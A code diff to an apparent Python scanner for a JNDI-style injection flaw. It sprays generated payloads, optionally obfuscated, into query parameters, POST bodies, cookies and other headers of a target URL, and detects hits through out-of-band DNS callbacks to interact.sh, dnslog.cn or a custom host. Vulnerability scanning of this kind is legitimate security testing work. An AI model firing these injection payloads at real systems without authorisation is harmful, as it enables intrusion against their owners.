@@ -1,16 +1,18 @@
 import argparse
 import asyncio
-from asyncio.tasks import sleep
+from time import sleep
 import base64
 import json
 import random
 import string
 import uuid
 from enum import Enum
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote
+import aiohttp
+import logging
 
 import requests
-from aiohttp import ClientSession
+from aiohttp import ClientSession, ClientResponse
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Hash import SHA256
 from Crypto.PublicKey import RSA
@@ -132,9 +134,16 @@ DEFAULT_HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
 }
 
+LOG_LEVELS = {
+    "debug": logging.DEBUG,
+    "info": logging.INFO,
+    "error": logging.ERROR,
+}
+
 proxy = None
 obfuscate_payloads = True
 request_path = None
+debug = True
 
 
 def obfuscate_string(to_obfuscate: str) -> str:
@@ -163,7 +172,9 @@ def create_payload(callback_url: str, protocol: str, test_path: str, test_domain
 
 
 async def send_requests(session: ClientSession, url: str, headers: dict, get_params: dict, post_params: dict) -> None:
-    opened_requests = [
+    opened_requests = []
+    logging.debug("Sending GET")
+    opened_requests.append(
         session.get(
             url,
             params=get_params,
@@ -171,7 +182,10 @@ async def send_requests(session: ClientSession, url: str, headers: dict, get_par
             timeout=3,
             ssl=False,
             proxy=proxy
-        ),
+        )
+    )
+    logging.debug("Sending POST as Form")
+    opened_requests.append(
         session.post(
             url,
             params=get_params,
@@ -180,7 +194,10 @@ async def send_requests(session: ClientSession, url: str, headers: dict, get_par
             timeout=3,
             ssl=False,
             proxy=proxy
-        ),
+        )
+    )
+    logging.debug("Sending POST as JSON")
+    opened_requests.append(
         session.post(
             url,
             params=get_params,
@@ -190,56 +207,61 @@ async def send_requests(session: ClientSession, url: str, headers: dict, get_par
             ssl=False,
             proxy=proxy
         ),
-    ]
+    )
     for request in opened_requests:
         try:
-            await request
+            resp: ClientResponse = await request
+            logging.debug(resp.status, await resp.text())
         except Exception as excep:
-            print(excep)
+            logging.exception(excep)
 
 
 async def test_injection_point(injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True, test_path: str = None):
-    print(f"Testing injection in {injection_type.value} with {callback_host} for {url}")
-    session = ClientSession()
-    if choose_random_path:
-        target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
-    else:
-        target_path = test_path
+    logging.info(f"Testing injection in {injection_type.value} with {callback_host} for {url}")
+    async with ClientSession() as session:
+        if choose_random_path:
+            target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
+        else:
+            target_path = test_path
 
-    for protocol in PROTOCOLS:
-        payload = create_payload(callback_host, protocol, target_path, urlparse(url).netloc, is_domain_in_callback)
-        print(f"Using payload: {payload}")
-        if injection_type == InjectionPointType.GetParam:
-            params = {
-                "q": payload
-            }
-        else:
-            params = None
-        if injection_type == InjectionPointType.PostParam:
-            data = POST_BODY.copy()
-            for value in data.values():
-                value.replace("[PAYLOAD]", payload)
-        else:
-            data = None
-        if injection_type == InjectionPointType.Header:
-            headers_to_inject = [
-                {header_name: payload} for header_name in HEADERS
-            ]
-        else:
-            headers_to_inject = [DEFAULT_HEADERS]
-
-        for header in headers_to_inject:
-            if "User-Agent" not in header.keys():
-                headers = DEFAULT_HEADERS.copy()
-                headers.update(header)
+        for protocol in PROTOCOLS:
+            payload = create_payload(callback_host, protocol, target_path, urlparse(url).netloc, is_domain_in_callback)
+            logging.debug(f"Using payload: {payload}")
+            if injection_type == InjectionPointType.GetParam:
+                params = {
+                    "q": payload
+                }
             else:
-                headers = header
-            await send_requests(session, url, headers, params, data)
+                params = None
+            if injection_type == InjectionPointType.PostParam:
+                data = POST_BODY.copy()
+                for value in data.values():
+                    value.replace("[PAYLOAD]", payload)
+            else:
+                data = None
+            if injection_type == InjectionPointType.Header:
+                headers_to_inject = [
+                    {header_name: quote(payload) if "Cookie" != header_name else f"session={quote(payload)}"} for header_name in HEADERS
+                ]
+                headers_to_inject.extend([
+                    {header_name: payload if "Cookie" != header_name else f"session={payload}"} for header_name in HEADERS
+                ])
+            else:
+                headers_to_inject = [DEFAULT_HEADERS.copy()]
+
+            for header in headers_to_inject:
+                if "User-Agent" not in header.keys():
+                    headers = DEFAULT_HEADERS.copy()
+                    headers.update(header)
+                else:
+                    headers = header
+                logging.debug(f"Sending request with headers: {headers}")
+                await send_requests(session, url, headers, params, data)
 
 
-async def test_all_injection_points(url: str, callback: str):
+async def test_all_injection_points(url: str, callback: str, domain_in_callback: bool = True, has_random_request_path: bool = True):
     for injection_type in InjectionPointType:
-        await test_injection_point(injection_type, callback, url, True, True)
+        await test_injection_point(injection_type, callback, url, domain_in_callback, has_random_request_path, request_path)
 
 
 def parse_arguments() -> argparse.Namespace:
@@ -247,8 +269,9 @@ def parse_arguments() -> argparse.Namespace:
 
     parser.add_argument('-u', '--url', help="The target to check", type=str, required=True)
     parser.add_argument('-p', '--proxy', help="A proxy URL", type=str, default=None)
-    parser.add_argument('-o', '--obfuscate', help="Whether payloads should be obfuscated or not", type=bool, default=False, action="store_true")
+    parser.add_argument('-o', '--obfuscate', help="Whether payloads should be obfuscated or not", default=False, action="store_true")
     parser.add_argument('--request-path', help="A custom path to add to the requests", type=str, default=None, action="store")
+    parser.add_argument('-l', '--log-level', help="How detailed logging should be.", choices=LOG_LEVELS.keys(), default="info")
 
     callback_group = parser.add_mutually_exclusive_group()
     callback_group.add_argument('--dns-callback', help="Which built-in DNS callback to use", type=str, choices=["interact.sh", "dnslog.cn"], default="interact.sh")
@@ -260,20 +283,23 @@ def parse_arguments() -> argparse.Namespace:
 def main():
     arguments = parse_arguments()
 
+    logging.basicConfig(level=LOG_LEVELS[arguments.log_level], format='%(asctime)s - %(levelname)s - %(message)s')
+
     if arguments.proxy:
         global proxy
         proxy = arguments.proxy
 
+    use_random_request_path = True
     if arguments.request_path:
         global request_path
         request_path = arguments.request_path
+        use_random_request_path = False
 
     if arguments.obfuscate:
         global obfuscate_payloads
         obfuscate_payloads = True
 
     dns_callback = None
-
     if arguments.custom_callback:
         callback_domain = arguments.custom_callback
     else:
@@ -283,7 +309,7 @@ def main():
             dns_callback = Dnslog()
         callback_domain = dns_callback.domain
 
-    asyncio.run(test_all_injection_points(arguments.url, callback_domain))
+    asyncio.run(test_all_injection_points(arguments.url, callback_domain, False, use_random_request_path))
 
     if not dns_callback:
         return
